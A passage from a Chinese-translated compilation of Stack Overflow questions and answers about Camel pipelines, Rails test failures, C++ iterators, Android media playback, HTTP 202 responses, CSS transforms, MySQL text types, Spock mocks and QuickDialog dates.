Camel 默认以管道模式运行（例如管道和过滤器 EIP - [http://camel.apache.org/pipes-and-filters.html](http://camel.apache.org/pipes-and-filters.html)），但如果您愿意，可以使用 < pipeline > 使其显式化。例如

```
<when>
   <simple>${header.type == 'heartbeat'}</simple>
   <pipeline>
     <to uri="bean:heartBeatHandler"/>
     <to uri="activemq:queue:outjob"/>
   </pipeline>
</when> 
```

但是很多时候你会省略 < pipeline > 并作为你的例子。

与管道相反的是多播（[http://camel.apache.org/multicast.html](http://camel.apache.org/multicast.html)），当您将这两者结合起来时，您可能需要使用管道，例如

```
<multicast>
  <pipeline>
     <to uri="bean:heartBeatHandler"/>
     <to uri="activemq:queue:outjob"/>
   </pipeline>
  <pipeline>
     <to uri="bean:somethingElse"/>
     <to uri="activemq:queue:somethingElse"/>
   </pipeline>
</multicast> 
```

# ruby-on-rails - Rails：功能测试因视图中未定义的方法而失败

> ID：14832969
> 
> 赞同：1
> 
> 时间：2013-02-12T12:49:20.183
> 
> 标签：ruby-on-rails, testing, view

我是 Rails 的新手，我遇到了一个功能测试的问题，该测试因未定义的方法而失败：

```
1) Error:
test_should_get_index(OrdersControllerTest):
ActionView::Template::Error: undefined method `name' for nil:NilClass
app/views/orders/index.html.erb:19:in `_app_views_orders_index_html_erb__2011622583_2177866460_0'
app/views/orders/index.html.erb:14:in `_app_views_orders_index_html_erb__2011622583_2177866460_0'
app/controllers/orders_controller.rb:8:in `index'
/test/functional/orders_controller_test.rb:9:in `test_should_get_index' 
```

在浏览器中一切正常，只是测试失败。

这是`views/orders/index.html.erb`文件内容：

```
<% @orders.each do |order| %>
<tr>
 <td><%= order.name %></td>
 <td><%= order.address %></td>
 <td><%= order.email %></td>
 <td><%= order.pay_type.name %></td> 
```

`Pay_type`是另一个包含支付类型名称的表；在订单表中有一个外键叫做`pay_type_id`. 在浏览器中，我正确看到了带有`order.pay_type.name`语句的支付类型名称，但功能测试失败。

`test_should_get_index:`

```
 test "should get index" do
   get :index
   assert_response :success
   assert_not_nil assigns(:orders)
 end 
```

*订购夹具：*

```
one:
  name: Dave Thomas
  address: MyText
  email: dave@example.org
  pay_type_id: 1

two:
  name: MyString
  address: MyText
  email: MyString
  pay_type_id: 1 
```

*paytypes 固定装置：*

```
one:
  id: 1
  name: Check

two:
  id: 2
  name: Credit Card

three:
  id: 3
  name: Purchase Order 
```

*订单控制器：*

```
def index
@orders = Order.paginate :page=>params[:page], :order=>'created_at desc',
  :per_page => 10

respond_to do |format|
  format.html # index.html.erb
  format.xml  { render :xml => @orders }
end
end 
```

有人可以帮助我吗？

我`raise Exception.new(@orders.inspect)`在视图中添加了以下错误：

```
`1) Error:
test_should_get_index(OrdersControllerTest):
ActionView::Template::Error: [#<Order id: 298486374, name: "MyString", address: "MyText", email: "MyString", created_at: "2013-02-12 14:05:11", updated_at: "2013-02-12 14:05:11", pay_type_id: 1>, #<Order id: 980190962, name: "Dave Thomas", address: "MyText", email: "dave@example.org", created_at: "2013-02-12 14:05:11", updated_at: "2013-02-12 14:05:11", pay_type_id: 1>]
app/views/orders/index.html.erb:14:in `_app_views_orders_index_html_erb__1955286768_2214618420_0'
app/controllers/orders_controller.rb:8:in `index'
/test/functional/orders_controller_test.rb:9:in `test_should_get_index'` 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T13:36:14.203

@orders 中有一些东西是 nil，当你调用`name`它时，它会给出错误。确保 @orders 仅包含订单，并且在测试时不包含 nil。

# c++ - 增加一个迭代器 c++

> ID：14832971
> 
> 赞同：4
> 
> 时间：2013-02-12T12:49:30.310
> 
> 标签：c++, iterator, increment

我的问题如下：我使用了一个迭代器，我想将每个元素与下一个元素进行比较。原型如下所示，如何增加迭代器才能进行比较？另外，我怎样才能为这种情况的发生设置适当的条件？我的意思是如何指向最后一个元素，而不是像 end() 函数一样指向最后一个元素：

```
std::vector<T>::const_iterator it;
std::vector<T>::const_iterator it2;
for (it = set.begin(), it != set.end(); it++)
{
  // some things happen
  if ( final == it )
  {
     if ( it != set.end()-1 ) // how to write properly condition?
     {
        it2 = it + 1; //how to assign the next here?
        if (...)//some condition
        {
          if ( it->func1() - it2->func1()) < 20 ) //actual comparison of two consecutive element values
            // do something
        }
      }
   }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2016-01-27T11:11:51.637

在**C++11**中使用函数[std::next()](http://www.cplusplus.com/reference/iterator/next/)和[std::prev()](http://www.cplusplus.com/reference/iterator/prev/)。

你的代码可能变成：

```
// before
it != std::set.end()-1

// after
it != std::prev(set.end()) 
```

和

```
// before
it2 = it + 1;

// after
it2 = std::next(it); 
```

对于非矢量容器也是如此，例如 map、set 或其他。

注意：在 之后`std::next(it)`，“it”迭代器保持不变！

注 2：`it2 = std::next(it,n);`根据需要使用来增加。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T12:58:11.747

You can use [adjacent_find](http://en.cppreference.com/w/cpp/algorithm/adjacent_find) to solve that. You should use the second form of that function (with predicate) and pass to the predicate your `some things happen` and `some condition` in c-tor

```
auto found = std::adjacent_find( set.begin(), set.end(),
    [some_comdition]( const T & left, const T & right ) {
        if ( some_comdition ) {
            if ( left.func1() - right.func1() < 20 ) {
                do_smth();
                // return true; if there's no need to continue
            }
        }
        return false;
    }
); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-04T09:22:08.027

基于`it++`可接受的事实，我们应该定义一个名为 的新迭代器`itplusone`，它被初始化为`itplusone = ++it`。这样，您可以安全地使用指向下一项的迭代器的含义`it`。`itplusone`同样清楚的是，以 terms 为界的迭代器的范围`itplusone != set.end()`。我使用这种方法来计算路径的总权重，该路径被定义为列表对象。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-02-12T12:55:19.337

In the `for` loop, you use `it++` which means `it = it + 1`, which is perfectly ok. So this one will be fine also `it2 = it + 1`. `it2` will be pointing to the next value.

In the `for` loop again, you use `it != set.end()`, which is again perfectly ok. So you can also `it + 1 < set.end()`, just like you did in your code.

I don't see anything wrong in your code, just wanted to explain.

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2020-12-08T04:58:00.180

有点晚了，才发现它，但就像上面提到的， ++​​ 迭代器工作正常。

```
vector<string> P
auto itA = begin(P);

while(itA != end(P))
{
    if(itA != end(P))
    {   
        ++itA; // 
    } 
} 
```

# android - 安卓列表视图。如何播放所有音乐并选择歌曲

> ID：14832972
> 
> 赞同：1
> 
> 时间：2013-02-12T12:49:29.517
> 
> 标签：android, media-player

此代码加载 ListView 中的所有音乐，并播放我选择的歌曲，我需要播放列表中的所有音乐，但是当我使用`while`or执行此操作时`for`，我无法在播放时选择另一首歌曲。

```
import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.provider.MediaStore;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.BaseAdapter;
import android.widget.ListView;
import android.widget.MediaController;
import android.widget.MediaController.MediaPlayerControl;
import android.widget.TextView;
import android.widget.AdapterView.OnItemClickListener;

public class MainActivity extends Activity {
  ListView musiclist;
  Cursor musiccursor;
  int music_column_index;
  int count;
  MediaPlayer mMediaPlayer;
MediaController mc;
  /** Called when the activity is first created. */
  @Override
  public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        init_phone_music_grid();

  }

  @SuppressWarnings("deprecation")
private void init_phone_music_grid() {
        System.gc();
        String[] proj = { MediaStore.Audio.Media._ID,
MediaStore.Audio.Media.DATA,
MediaStore.Audio.Media.DISPLAY_NAME,
MediaStore.Video.Media.SIZE };
        musiccursor = managedQuery(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
proj, null, null, null);
        count = musiccursor.getCount();
        musiclist = (ListView) findViewById(R.id.listView1);
        musiclist.setAdapter(new MusicAdapter(getApplicationContext()));

        musiclist.setOnItemClickListener(musicgridlistener);

        mMediaPlayer = new MediaPlayer();

  }

  private OnItemClickListener musicgridlistener = new OnItemClickListener() {
        public void onItemClick(AdapterView parent, View v, int position,
long id) {

            System.gc();
              music_column_index = musiccursor
.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA);
              musiccursor.moveToPosition(position);

              String filename = musiccursor.getString(music_column_index);

              try {
                    if (mMediaPlayer.isPlaying()) {
                          mMediaPlayer.reset();
                    }
                    mMediaPlayer.setDataSource(filename);
                    mMediaPlayer.prepare();
                    mMediaPlayer.start();
              } catch (Exception e) {

              }

             //

        }

  };

  private OnItemClickListener musicgridlistener1 = new OnItemClickListener() {
      public void onItemClick(AdapterView parent, View v, int position,
long id) {

        System.gc();
            music_column_index = musiccursor
.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA);
            musiccursor.moveToPosition(position);

            String filename = musiccursor.getString(music_column_index);

            try {
                  if (mMediaPlayer.isPlaying()) {
                        mMediaPlayer.reset();
                  }
                  mMediaPlayer.setDataSource(filename);
                  mMediaPlayer.prepare();
                  mMediaPlayer.start();
            } catch (Exception e) {

            }
       try{
            while(mMediaPlayer.isPlaying()){}

      } catch (Exception e)
      {
          //handle the exception 
          e.printStackTrace();
          }
          while(musiccursor.getPosition()!= musiccursor.getCount()){
               mMediaPlayer.reset();
             musiccursor.moveToNext();

               filename = musiccursor.getString(music_column_index);

              try {
                    if (mMediaPlayer.isPlaying()) {
                          mMediaPlayer.reset();
                    }
                    mMediaPlayer.setDataSource(filename);
                    mMediaPlayer.prepare();
                    mMediaPlayer.start();

              } catch (Exception e) {

              }
              while(mMediaPlayer.isPlaying()){}
          }

           //
      }

};

  public class MusicAdapter extends BaseAdapter {
        private Context mContext;

        public MusicAdapter(Context c) {
              mContext = c;
        }

        public int getCount() {
              return count;
        }

        public Object getItem(int position) {
              return position;
        }

        public long getItemId(int position) {
              return position;
        }

        public View getView(int position, View convertView, ViewGroup parent) {
            System.gc();
            String id = null;
            TextView tv;
            if (convertView == null) {
            tv = new TextView(mContext.getApplicationContext());
            } else{
            tv = (TextView) convertView;
            }

            musiccursor.moveToPosition(position);

            music_column_index = musiccursor
            .getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME);
            id = musiccursor.getString(music_column_index);
            music_column_index =          musiccursor.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE);
            id += " Size(KB):" + musiccursor.getString(music_column_index);
            tv.setText(id);
            return tv;
            }
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:53:37.413

Rather than looping through your data, you should build a playlist Queue. Then you can populate and depopulate it as necessary, and don't need to worry about the data source changing.

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-12T12:53:53.850

For the import the default music player :

To simply launch the music player do:

```
Intent intent = new Intent(MediaStore.INTENT_ACTION_MUSIC_PLAYER);
startActivity(intent); 
```

please note, that this works only in SDK API level 8 up

# rest - HTTP 状态 202 - 如何提供有关异步请求完成的信息？

> ID：14832983
> 
> 赞同：28
> 
> 时间：2013-02-12T12:50:22.330
> 
> 标签：rest, http-headers, http-status-codes

`202 - Accepted`当服务器返回异步请求的状态代码时，估计请求完成的适当方法是什么？

从[HTTP 规范](http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html#sec10.2.3)（*我添加的斜体*）：

> **202 接受**
> 
> 请求已被接受处理，但处理尚未完成。[...]
> 
> 与此响应一起返回的实体应该包括请求当前状态的指示以及指向状态监视器的指针或*用户可以期望何时完成请求的一些估计*。

以下是一些想法：

*   我看过[max-age](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.9.3)指令，但使用它会滥用`Cache-Control`吗？
*   在响应正文中返回预期的等待时间？
*   添加特定于应用程序的`X-`响应标头，但`X-`标头在[RFC 6648](http://datatracker.ietf.org/doc/rfc6648/)中已弃用？
*   添加（非`X-`）特定响应标头？如果是这样，它应该如何命名？SO question [Custom HTTP headers :naming conventions](https://stackoverflow.com/questions/3561381/)给出了一些想法，但在弃用之后，它只回答了 HTTP 标头的格式，而不是它们应该如何命名。
*   其他建议？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-02-12T13:29:51.727

绝对不要为此滥用现有的 HTTP 标头。由于它是您自己的服务器，因此您可以定义响应的外观。您可以（并且应该）选择最适合此信息的预期接收者的任何响应，并在响应正文中返回实际信息。

例如，如果您只对显示人类可读的消息感兴趣，那么您可以返回`text/plain`说“您的请求可能会在接下来的 30 分钟内得到处理。”。

在光谱的另一端，您可能希望以所有 REST 方式返回`application/json`，可能格式如下（我完全是当场编造的）：

```
{
  "status": "pending",
  "completion": {
    "estimate": "Thu Sep 08 2011 12:00:00 GMT-0400",
    "rejected-after": "Fri Sep 09 2011 12:00:00 GMT-0400",
  },
  "tracking": {
    "url": "http://server/status?id=myUniqueId"
  }
} 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-02-12T13:31:47.467

您可以使用`Location`标头指定状态监视器的 URL。当前状态和估计之类的内容可以放在自定义标头中（除了您自己的软件之外没有人会使用），也可以放在响应正文中（至少 Web 浏览器会向用户显示）。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-03-27T09:51:01.890

虽然没有明确提及`202 - Accepted`响应代码，但`Retry-After`标头似乎是一个合适的选项。从[文档](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.37)中：

> The Retry-After response-header field can be used [...] to indicate how long the service is expected to be unavailable to the requesting client.

# css - 使用变换旋转“a”元素

> ID：14832985
> 
> 赞同：0
> 
> 时间：2013-02-12T12:50:24.317
> 
> 标签：css, transform

为什么 CSS3 转换不适**用于**（锚）元素？

```
<a id="a" href="#">Rotate This</a>
#a
{
    transform:rotate(7deg);
    -ms-transform:rotate(7deg);
    -moz-transform:rotate(7deg);
    -webkit-transform:rotate(7deg);
    -o-transform:rotate(7deg);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:51:30.497

旋转不适用于内联元素

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:53:00.527

您可以将锚点包裹在 div 中，然后旋转它。[**小提琴**](http://jsfiddle.net/3zYvt/)

```
<div><a id="a" href="#">Rotate This</a></div> 
```

@Byscripts 说得对，转换不支持内联元素，例如 a, span。

# mysql - 用于描述的数据类型是什么？

> ID：14832991
> 
> 赞同：0
> 
> 时间：2013-02-12T12:50:40.053
> 
> 标签：mysql, sqlite, types, sqldatatypes

我想知道我需要使用什么数据类型来进行描述。

例子：

```
Baseball cap by adidas Originals 
-   Made from cotton
-   Embroidered brand logo to the front
-   Five panel styling
-   Ventilation holes to the side 
```

我需要使用什么数据类型，所以当我想使用这些数据时，它仍然包含空格和缩进？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:52:43.070

它与数据类型无关。您可以使用`varchar`或`text`。如果您尝试呈现为 HTML，那么您需要在`<pre>`标签之间呈现它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:54:49.373

Your text will be saved as it is, your text render is the one that has to understand the line breaks, indents, etc.

You can use any alphanumeric datatype.

# groovy - 如果传递了一个空字符串，spock 不会返回模拟响应

> ID：14832996
> 
> 赞同：2
> 
> 时间：2013-02-12T12:51:04.570
> 
> 标签：groovy, spock

```
class Foo {
 def getSomeFood(def param){
 //do some stuff
 } 
```

当你在规范中模拟它时

```
 def foo=Mock() 
```

并使方法返回一些东西

```
 foo.getSomeFood(_) >> "apple" 
```

如果此类正在另一个类中使用，例如

```
foo.getSomeFood("") 
```

它返回 null 而不是 "apple"

这可能是 spock 中的一个错误......有人知道为什么它不返回任何数据吗？

# iphone - QuickDialog 没有以正确的方式显示日期

> ID：14832999
> 
> 赞同：1
> 
> 时间：2013-02-12T12:51:07.767
> 
> 标签：iphone, ios, objective-c, quickdialog

我正在使用 quickdialog 来使用动态表单。Web 服务使用快速对话框 JSON 构建表单。对于 QDateTimeInlineElement，他为我提供了这个 JSON。

```
 {"type":"QDateTimeInlineElement","title":"datum","placeholder":"vul in","bind":"textValue:datum","key":"datum","mode":"Date"},
   {"type":"QDateTimeInlineElement","title":"tijd","placeholder":"vul in","bind":"textValue:tijd","key":"tijd","mode":"Time"},
  {"type":"QDateTimeInlineElement","title":"datumtijd","placeholder":"vul in","bind":"textValue:datumtijd","key":"datumtijd","mode":"DateAndTime"}, 
```

在我的代码中，我使用以下代码将所有值放入字典中。

```
 NSMutableDictionary *script = [NSMutableDictionary new];
 [self.root fetchValueUsingBindingsIntoObject:script]; 
```

但是当我查看这本词典的输出时，我注意到以下 LOG

```
Date = "00:00:-34";
DateTime = "00:00:-34"; 
TIME = "00:00:-34"; 
```

有人可以帮我吗？亲切的问候 ！